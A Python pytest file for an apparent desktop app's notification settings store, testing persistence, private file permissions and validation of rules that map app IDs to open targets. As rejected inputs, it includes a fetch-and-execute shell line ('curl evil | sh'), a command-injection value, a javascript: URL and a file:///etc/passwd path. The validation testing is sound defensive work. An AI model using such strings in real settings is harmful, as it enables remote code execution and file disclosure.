"""Persistent popup policy is validated and written privately."""
from __future__ import annotations

import json
import stat

import pytest

from blueferry.notification_policy import NotificationPolicyStore


def test_default_is_messages_only(tmp_path) -> None:
    store = NotificationPolicyStore(tmp_path / "blueferry" / "settings.json")

    assert store.value == "messages"
    assert store.contacts_only is False


def test_policy_persists_and_preserves_future_settings(tmp_path) -> None:
    path = tmp_path / "blueferry" / "settings.json"
    path.parent.mkdir()
    path.write_text(json.dumps({"future_setting": 7}))
    store = NotificationPolicyStore(path)

    assert store.set("ALL") == "all"
    assert store.set_contacts_only(True) is True

    assert NotificationPolicyStore(path).value == "all"
    assert NotificationPolicyStore(path).contacts_only is True
    assert json.loads(path.read_text()) == {
        "future_setting": 7,
        "desktop_notifications": "all",
        "contacts_only_notifications": True,
    }
    assert stat.S_IMODE(path.parent.stat().st_mode) == 0o700
    assert stat.S_IMODE(path.stat().st_mode) == 0o600


def test_invalid_policy_does_not_replace_existing_value(tmp_path) -> None:
    path = tmp_path / "blueferry" / "settings.json"
    store = NotificationPolicyStore(path)
    store.set("none")

    with pytest.raises(ValueError, match="all, messages, none"):
        store.set("sometimes")

    assert store.value == "none"
    assert NotificationPolicyStore(path).value == "none"


def test_contacts_only_requires_a_real_boolean(tmp_path) -> None:
    store = NotificationPolicyStore(tmp_path / "settings.json")

    with pytest.raises(ValueError, match="must be a boolean"):
        store.set_contacts_only(1)  # type: ignore[arg-type]

    assert store.contacts_only is False


def test_open_map_is_empty_by_default(tmp_path) -> None:
    store = NotificationPolicyStore(tmp_path / "settings.json")

    assert store.open_map == {}
    assert store.open_target("com.apple.mobilemail") is None


def test_open_map_persists_beside_other_notification_settings(tmp_path) -> None:
    path = tmp_path / "blueferry" / "settings.json"
    path.parent.mkdir()
    path.write_text(json.dumps({"future_setting": 7}))
    store = NotificationPolicyStore(path)
    store.set("all")

    assert store.set_open_target(
        "com.apple.mobilemail", "org.mozilla.Thunderbird.desktop"
    ) == {"com.apple.mobilemail": "org.mozilla.Thunderbird.desktop"}
    store.set_open_target(" net.whatsapp.WhatsApp ", " https://web.whatsapp.com ")
    # Replacing an existing rule keeps a single entry.
    store.set_open_target("com.apple.mobilemail", "https://mail.example.com/")

    reloaded = NotificationPolicyStore(path)
    assert reloaded.open_map == {
        "com.apple.mobilemail": "https://mail.example.com/",
        "net.whatsapp.WhatsApp": "https://web.whatsapp.com",
    }
    assert reloaded.open_target("net.whatsapp.WhatsApp").value == "https://web.whatsapp.com"
    assert reloaded.value == "all"
    assert json.loads(path.read_text())["future_setting"] == 7
    assert stat.S_IMODE(path.stat().st_mode) == 0o600

    assert reloaded.remove_open_target("com.apple.mobilemail") is True
    assert reloaded.remove_open_target("com.apple.mobilemail") is False
    assert NotificationPolicyStore(path).open_map == {
        "net.whatsapp.WhatsApp": "https://web.whatsapp.com",
    }


@pytest.mark.parametrize(("bundle_id", "target"), [
    ("com.example.App", "javascript:alert(1)"),
    ("com.example.App", "file:///etc/passwd"),
    ("com.example.App", "thunderbird; id"),
    ("com.example.App", "/usr/bin/thunderbird"),
    ("com.apple.MobileSMS", "https://example.com"),
    ("not a bundle", "https://example.com"),
])
def test_invalid_open_rule_does_not_change_the_saved_map(tmp_path, bundle_id, target) -> None:
    path = tmp_path / "settings.json"
    store = NotificationPolicyStore(path)
    store.set_open_target("com.apple.mobilemail", "org.mozilla.Thunderbird.desktop")
    before = path.read_text()

    with pytest.raises(ValueError):
        store.set_open_target(bundle_id, target)

    assert path.read_text() == before
    assert store.open_map == {"com.apple.mobilemail": "org.mozilla.Thunderbird.desktop"}


def test_open_rule_count_is_bounded(tmp_path) -> None:
    from blueferry.limits import MAX_NOTIFICATION_OPEN_MAPPINGS

    store = NotificationPolicyStore(tmp_path / "settings.json")
    for index in range(MAX_NOTIFICATION_OPEN_MAPPINGS):
        store.set_open_target(f"com.example.app{index}", "https://example.com/")

    with pytest.raises(ValueError, match="at most"):
        store.set_open_target("com.example.oneTooMany", "https://example.com/")
    # Replacing an existing rule at the limit is still allowed.
    store.set_open_target("com.example.app0", "https://example.org/")
    assert store.open_map["com.example.app0"] == "https://example.org/"


def test_hand_edited_open_rules_are_revalidated_on_load(tmp_path) -> None:
    path = tmp_path / "settings.json"
    path.write_text(json.dumps({"notification_open_map": {
        "com.apple.mobilemail": "org.mozilla.Thunderbird.desktop",
        "com.example.Evil": "sh -c 'curl evil | sh'",
        "com.example.Local": "file:///home",
    }}))
    path.chmod(0o600)

    store = NotificationPolicyStore(path)

    assert store.open_map == {"com.apple.mobilemail": "org.mozilla.Thunderbird.desktop"}
    assert store.open_target("com.example.Evil") is None
